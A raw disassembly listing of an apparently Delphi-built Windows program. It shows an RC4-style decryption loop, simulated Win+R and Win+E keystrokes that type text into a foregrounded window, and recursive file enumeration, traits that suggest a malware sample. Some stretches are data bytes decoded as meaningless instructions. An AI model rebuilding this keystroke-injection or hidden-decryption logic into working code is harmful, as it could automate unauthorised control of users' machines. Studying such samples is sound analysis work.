je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor esi esi
lea eax [ ebp - 0x41c ]
lea eax [ ebp - 0x8 ]
call j_sub_4059f0
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx ebx
call sub_4611c4
sub ebx 0x4
mov ebx [ ebx ]
mov [ eax ] esi
inc esi
add eax 0x4
cmp esi 0x100
jne r-xdata
xor ebx ebx
xor esi esi
lea ecx [ ebp - 0x41c ]
mov eax esi
cdq
idiv edi
mov eax [ ebp - 0xc ]
movzx eax [ eax + edx ]
add ebx [ ecx ]
add eax ebx
and eax 0x800000ff
jns r-xdata
sub edi 0x4
mov edi [ edi ]
mov ebx eax
movzx eax [ ecx ]
mov [ ebp - 0x15 ] al
mov eax [ ebp + ebx * 4 - 0x41c ]
mov [ ecx ] eax
movzx eax [ ebp - 0x15 ]
mov [ ebp + ebx * 4 - 0x41c ] eax
inc esi
add ecx 0x4
cmp esi 0x100
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
mov edi [ ebp - 0x8 ]
test edi edi
je r-xdata
xor ebx ebx
xor edi edi
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
push esi
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx esi
call sub_4611c4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
dec eax
test eax eax
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor esi esi
mov edx [ ebp - 0x14 ]
xchg edx eax
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
add edi [ ebp + ebx * 4 - 0x41c ]
and edi 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov eax [ ebp - 0x14 ]
call j_sub_4059f0
mov edx [ ebp - 0x10 ]
mov ecx ebx
call sub_4611c4
sub ebx 0x4
mov ebx [ ebx ]
movzx eax [ ebp + ebx * 4 - 0x41c ]
mov [ ebp - 0x15 ] al
mov eax [ ebp + edi * 4 - 0x41c ]
mov [ ebp + ebx * 4 - 0x41c ] eax
movzx eax [ ebp - 0x15 ]
mov [ ebp + edi * 4 - 0x41c ] eax
mov eax [ ebp + ebx * 4 - 0x41c ]
add eax [ ebp + edi * 4 - 0x41c ]
and eax 0x800000ff
jns r-xdata
dec edi
or edi 0xffffff00
inc edi
movzx eax [ ebp + eax * 4 - 0x41c ]
mov edx [ ebp - 0x10 ]
xor [ edx + esi ] al
inc esi
dec [ ebp - 0x1c ]
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
inc ebx
and ebx 0x800000ff
jns r-xdata
sub_4619c4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
push ebx
call keybd_event
push 0x0
push 0x2
push 0x0
push ebx
call keybd_event
pop ebx
retn
sub_4619e4
push ebx
mov ebx eax
movzx eax bl
cmp eax 0x5b
jge r-xdata
cmp eax 0xa3
jg r-xdata
cmp eax 0x2e
jge r-xdata
sub eax 0xa7
je r-xdata
je r-xdata
add eax 0xffffffd2
sub eax 0xc
jb r-xdata
sub eax 0x23
je r-xdata
mov dl 0x1
mov al 0x10
call sub_461990
push ebx
call VkKeyScanA
call sub_4619c4
xor edx edx
mov al 0x10
call sub_461990
pop ebx
retn
sub eax 0x9
je r-xdata
add eax 0xffffffa5
sub eax 0x4
jb r-xdata
sub eax 0x5
je r-xdata
mov al 0x1
call sub_4619ac
push ebx
call VkKeyScanA
call sub_4619c4
xor eax eax
call sub_4619ac
pop ebx
retn
sub eax 0x2
je r-xdata
sub eax 0x5
jne r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
sub eax 0x6
je r-xdata
push ebx
call VkKeyScanA
call sub_4619c4
pop ebx
retn
add eax 0xffffffe5
sub eax 0x4
jb r-xdata
dec eax
sub eax 0x1a
jb r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub_461a98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_461b5f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_461b33
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
push 0x1
push ebx
call ShowWindow
push ebx
call SetForegroundWindow
mov ebx 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40580c
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx esi [ eax + ebx - 0x1 ]
mov eax esi
call sub_4619e4
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461b66
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_461b8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_461c0e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_461be7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40580c
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx esi [ eax + ebx - 0x1 ]
mov eax esi
call sub_4619e4
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c15
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_461c1c
push 0x0
push 0x0
push 0x0
push 0x5b
call keybd_event
push 0x0
push 0x0
push 0x0
push 0x52
call keybd_event
push 0x0
push 0x2
push 0x0
push 0x52
call keybd_event
push 0x0
push 0x2
push 0x0
push 0x5b
call keybd_event
retn
sub_461c54
push 0x0
push 0x0
push 0x0
push 0x5b
call keybd_event
push 0x0
push 0x0
push 0x0
push 0x45
call keybd_event
push 0x0
push 0x2
push 0x0
push 0x45
call keybd_event
push 0x0
push 0x2
push 0x0
push 0x5b
call keybd_event
retn
sub_461c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
sbb eax 0x580046
add [ eax ] al
clc
jg r-xdata
test [ esi + edi * 8 + 0x408bffff ] edx
inc eax
push 0x65726854
popad
push ebp
mov ebp esp
add esp 0xfffffe88
xor edx edx
mov [ ebp - 0x178 ] edx
mov [ ebp - 0x174 ] edx
mov [ ebp - 0x170 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x16c ] eax
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_461f3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x16c ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
jb r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ 0x61655354 ] cl
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ edi + ebx + 0x46 ] ch
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc esp
add [ eax ] al
add [ eax + edx + 0x540040 ] dl
add [ eax ] al
or eax 0x61655354
mov eax [ ebp - 0x16c ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_461e1f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f42
lea eax [ ebp - 0x178 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
call sub_40e830
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x16c ]
mov ecx [ eax + 0x44 ]
lea eax [ ebp - 0x170 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x170 ]
lea ecx [ ebp - 0x168 ]
mov edx 0x2f
call sub_40a488
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x16c ]
mov eax [ eax + 0x40 ]
lea eax [ ebp - 0x178 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x178 ]
lea ecx [ ebp - 0x168 ]
mov edx 0x10
call sub_40a488
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4fc
retn
mov eax [ ebp - 0x16c ]
cmp [ eax + 0xd ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_461ef8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x174 ]
mov ecx [ ebp - 0x154 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov edx [ ebp - 0x174 ]
mov eax [ ebp - 0x16c ]
mov eax [ eax + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x168 ]
call sub_40a4d8
test eax eax
jne r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4d8
test eax eax
jne r-xdata
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405974
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4fc
retn
mov eax [ ebp - 0x16c ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405974
je r-xdata
test [ ebp - 0x158 ] 0x10
je r-xdata
mov eax [ ebp - 0x16c ]
add eax 0x40
mov ecx [ ebp - 0x154 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x16c ]
call sub_461d10
sub_461d10
push ebp
mov ebp esp
add esp 0xfffffe88
xor edx edx
mov [ ebp - 0x178 ] edx
mov [ ebp - 0x174 ] edx
mov [ ebp - 0x170 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x16c ] eax
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_461f3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x16c ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f42
lea eax [ ebp - 0x178 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x16c ]
mov eax [ eax + 0x40 ]
call sub_40e830
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x16c ]
mov ecx [ eax + 0x44 ]
lea eax [ ebp - 0x170 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x170 ]
lea ecx [ ebp - 0x168 ]
mov edx 0x2f
call sub_40a488
test eax eax
jne r-xdata
mov eax [ ebp - 0x16c ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_461e1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x178 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x178 ]
lea ecx [ ebp - 0x168 ]
mov edx 0x10
call sub_40a488
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4fc
retn
mov eax [ ebp - 0x16c ]
cmp [ eax + 0xd ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_461ef8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x174 ]
mov ecx [ ebp - 0x154 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov edx [ ebp - 0x174 ]
mov eax [ ebp - 0x16c ]
mov eax [ eax + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x168 ]
call sub_40a4d8
test eax eax
jne r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4d8
test eax eax
jne r-xdata
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405974
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a4fc
retn
mov eax [ ebp - 0x16c ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405974
je r-xdata
test [ ebp - 0x158 ] 0x10
je r-xdata
mov eax [ ebp - 0x16c ]
add eax 0x40
mov ecx [ ebp - 0x154 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x16c ]
call sub_461d10
sub_461f63
inc [ edx ]
add [ eax ] al
add [ esi ] ch
add [ cs : eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46205f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
xor eax eax
push ebp
push sub_46203f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_461d10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462049
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x54 ]
mov eax ebx
call sub_4894c0
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_489470
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x50 ]
mov eax ebx
call sub_4894bc
mov eax ebx
call sub_41fef0
mov eax [ ebp - 0x4 ]
add eax 0x4c
call sub_40f944
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_462078
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4620e4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40a5a0
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x40 ]
call sub_405584
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40a68c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x44 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4620eb
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_4620f8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_462139
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x54 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462140
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4621b4
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4621a0
sub_4621dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
xor eax eax
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_462218
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4621b4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_46224c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46227d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462284
retn
mov eax [ rw-data ]
call sub_404650
sub_462339
or al 0x49
dec ebp
imul esp [ fs : ecx + 0x46 ] 0x65746c69
jb r-xdata
push esi
aam 0xa
into
adc [ eax - 0x50dfffc6 ] esi
or esp [ edi + 0x69440b70 ]
jb r-xdata
inc [ eax ]
add [ ecx - 0x2ba95798 ] ebx
or cl dh
adc [ eax - 0x50dfffc6 ] esi
or esp [ edi + 0x69440b70 ]
jb r-xdata
inc eax
xor esp ecx
arpl [ ebx + edx * 2 + 0x68 ] si
outsd
ja r-xdata
cmp al [ eax ]
and [ edi + 0xb70a70b ] ch
inc esp
imul esi [ edx + 0x65 ] 0x68537463
arpl [ ebx + edx * 2 + 0x68 ] si
outsd
ja r-xdata
arpl [ ebx + edx * 2 + 0x68 ] si
outsd
ja r-xdata
pop es
add bh bh
jmp eax
push es
add bh bh
call [ eax + r-xdata ]
ud2
cmp [ eax + eax ] eax
or [ eax ] eax
sub_462668
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x26
inc esi
add [ eax ] dl
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esp + edx * 2 ] dl
push ebx
popad
insd
jo r-xdata
int 0x49
cli
dec esp
or [ edi ] esp
inc esi
add [ ebx ] dl
daa
inc esi
add [ 0xffffffffe9004627 ] bl
inc edi
jb r-xdata
add al ch
inc edi
jb r-xdata
inc [ ebx - 0x17fbdbbc ]
jmp sub_4070f4
bound esp [ edx + 0x65 ]
jb r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add ah ch
cmp al 0x46
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] cl
add [ eax ] al
add [ eax + 0x25 ] bh
inc esi
add [ eax ] cl
add [ eax ] al
add al dl
and al 0x46
add [ eax + eax ] cl
add [ eax ] al
inc eax
and eax 0x100046
add [ eax ] al
movsb [ edi ] [ esi ]
and eax [ esi ]
adc al 0x0
add [ eax ] al
fsub [ ebx ]
inc esi
add [ eax ] bl
add [ eax ] al
add [ esp ] bl
inc esi
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x46 ] ch
add [ eax + eax ] ah
add [ eax ] al
pop eax
and al 0x46
add [ eax ] ch
add [ eax ] al
add [ ebx + 0x46 ] ch
add [ eax + eax ] ch
add [ eax ] al
xchg esp eax
and al 0x46
add [ eax ] dh
add [ eax ] al
add ah ch
and eax 0x340046
add [ eax ] al
insb
and eax [ esi ]
cmp [ eax ] al
add [ eax ] al
sub [ esi ] ah
inc esi
add [ eax ] al
add [ eax ] al
les esp [ edi ]
inc esi
add [ eax ] dl
add [ eax ] al
or al 0x54
push esi
imul esp [ ebp + 0x6f ] 0x706d6153
insb
nop
lodsb [ esi ]
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
bound esp [ edx + 0x65 ]
jb r-xdata
add al 0xe9
pop edi
add al 0x0
add [ ebx - 0x17fbdbbc ] al
jmp sub_4070b8
inc edx
dec ecx
insd
jo r-xdata
add [ edx + 0x54004628 ] ch
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
inc edx
lea eax [ eax ]
enter 0x4627 0x0
adc [ edx ] eax
xor al 0x18
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
inc esi
add cl bh
inc esi
add cl cl
inc esi
add cl bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
daa
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax + eax ] cl
add bh bh
mov al 0x27
inc esi
add [ edi + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004627 ] dh
add [ eax ] al
add ah ah
adc [ eax ] eax
cwde
dec eax
inc eax
add [ eax + esi * 2 + 0x70980040 ] cl
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax + 0x4004070 ] ch
inc esi
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] dl
push esp
push ebx
popad
insd
jo r-xdata
daa
inc esi
add cl ch
lea eax [ eax ]
int3
sub_4628c4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_462983
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_40700c
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
call sub_40700c
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46298a
lea eax [ ebp - 0x18 ]
call sub_411650
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x8 ]
call sub_40700c
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov eax esi
lea edx [ ebp - 0x18 ]
call sub_414a44
mov bl 0x1
sub_4629c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_462abe
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x1
cmp [ ebx ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_462a15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov [ ebp - 0x10 ] eax
test [ ebp - 0xd ] 0x80
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ac5
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
lea eax [ ebp - 0x4 ]
call sub_40700c
push 0x0
lea eax [ ebp - 0x4 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
test [ ebp - 0xd ] 0x80
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4628c4
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_462ad0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
call sub_407080
xor eax eax
push ebp
push sub_462b58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462b5f
lea eax [ ebp + 0x14 ]
call sub_40700c
retn
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push 0x402
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push eax
call SendMessageA
jmp r-xdata
sub_462bb0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
call sub_40700c
lea eax [ edi + 0xc ]
call sub_40700c
lea eax [ edi + 0x10 ]
call sub_40700c
lea eax [ edi + 0x14 ]
call sub_40700c
lea eax [ edi + 0x18 ]
call sub_40700c
mov [ edi + 0x1c ] 0x0
lea eax [ edi + 0x20 ]
call sub_40700c
lea eax [ edi + 0x24 ]
call sub_40700c
lea eax [ edi + 0x28 ]
call sub_40700c
lea eax [ edi + 0x30 ]
call sub_40700c
lea eax [ edi + 0x34 ]
call sub_40700c
lea eax [ edi + 0x38 ]
call sub_40700c
xor eax eax
mov [ edi + 0x3c ] eax
lea eax [ edi + 0x40 ]
call sub_40700c
lea eax [ edi + 0x2c ]
call sub_40700c
xor eax eax
mov [ edi + 0x48 ] eax
mov [ edi + 0x4c ] eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0xc ]
movzx edx [ ebp + 0x10 ]
mov eax edi
call sub_462c84
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_462c84
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x49 ] dl
mov ebx eax
lea eax [ ebp - 0x48 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_462eb6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
